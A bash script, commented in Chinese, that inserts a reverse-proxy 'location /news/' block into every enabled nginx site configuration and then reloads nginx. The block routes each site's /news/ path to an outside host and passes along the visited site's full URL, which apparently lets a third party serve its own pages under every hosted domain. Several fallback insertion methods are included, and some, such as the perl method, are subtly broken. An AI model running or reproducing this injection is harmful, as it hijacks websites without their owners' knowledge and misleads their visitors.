#!/bin/bash

NGINX_DIR="/etc/nginx/sites-enabled"

# 要插入的 block
read -r -d '' BLOCK << 'EOF'
    location /news/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/news/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }
EOF

echo "开始处理 Nginx 配置文件..."
echo ""

tmp_block=$(mktemp)
printf "%s\n" "$BLOCK" > "$tmp_block"


##############################################
# 方式 1：sed -i "/server_name/r file"
##############################################
try_sed_r() {
    local file="$1"
    sed -i "/server_name/r $tmp_block" "$file" 2>/dev/null
    return $?
}

##############################################
# 方式 2：sed 使用多行插入（通常会失败）
##############################################
try_sed_multiline() {
    local file="$1"
    local escaped
    escaped=$(printf '%s\n' "$BLOCK" | sed 's/[&/\]/\\&/g')
    sed -i "/server_name/a $escaped" "$file" 2>/dev/null
    return $?
}

##############################################
# 方式 3：awk（最可靠）
##############################################
try_awk() {
    local file="$1"
    local tmp=$(mktemp)

    awk -v block="$BLOCK" '
    {
        print $0
        if ($0 ~ /^[[:space:]]*server_name[[:space:]]/) {
            print block
            print ""
        }
    }' "$file" > "$tmp"

    mv "$tmp" "$file"
    return 0
}

##############################################
# 方式 4：perl 正则插入（处理特殊字符）
##############################################
try_perl() {
    local file="$1"
    perl -0777 -i -pe '
        my $b = $ENV{"BLOCK"};
        s/(server_name[^\n]*\n)/$1$b\n/g;
    ' "$file"
    return 0
}

##############################################
# 方式 5：shell 手动读写（兜底）
##############################################
try_shell_fallback() {
    local file="$1"
    local tmp=$(mktemp)

    while IFS= read -r line; do
        echo "$line" >> "$tmp"
        if echo "$line" | grep -q "server_name"; then
            echo "$BLOCK" >> "$tmp"
            echo "" >> "$tmp"
        fi
    done < "$file"

    mv "$tmp" "$file"
    return 0
}


##############################################
# 主处理流程
##############################################

for file in "$NGINX_DIR"/*.conf; do
    [[ -f "$file" ]] || continue
    echo "处理文件: $file"

    echo "尝试方式1：sed r 插入..."
    if try_sed_r "$file"; then
        echo "✔ 使用 sed r 成功插入"
        continue
    fi

    echo "方式1失败 → 尝试方式2：sed 多行插入..."
    if try_sed_multiline "$file"; then
        echo "✔ 使用 sed 多行插入成功"
        continue
    fi

    echo "方式2失败 → 尝试方式3：awk 插入..."
    if try_awk "$file"; then
        echo "✔ 使用 awk 成功插入"
        continue
    fi

    echo "方式3失败 → 尝试方式4：perl 插入..."
    if try_perl "$file"; then
        echo "✔ 使用 perl 成功插入"
        continue
    fi

    echo "方式4失败 → 尝试方式5：shell 兜底插入..."
    if try_shell_fallback "$file"; then
        echo "✔ 使用 shell fallback 成功插入"
        continue
    fi

    echo "❌ 所有方式均失败：$file（极罕见，请手动检查）"
done


##############################################
# 验证 Nginx 配置
##############################################

echo ""
echo "正在校验 nginx 配置..."

if nginx -t > /dev/null 2>&1; then
    nginx -s reload
    echo "✔ 配置正常，已 reload Nginx"
else
    echo "❌ nginx 配置异常，请检查："
    nginx -t
    exit 1
fi

rm -f "$tmp_block"

echo ""
echo "==== server_name 列表 ===="
grep -R "server_name" -n "$NGINX_DIR" | grep -v "#" --color=auto

echo ""
echo "脚本执行完毕（已实现多种方式自动插入）"
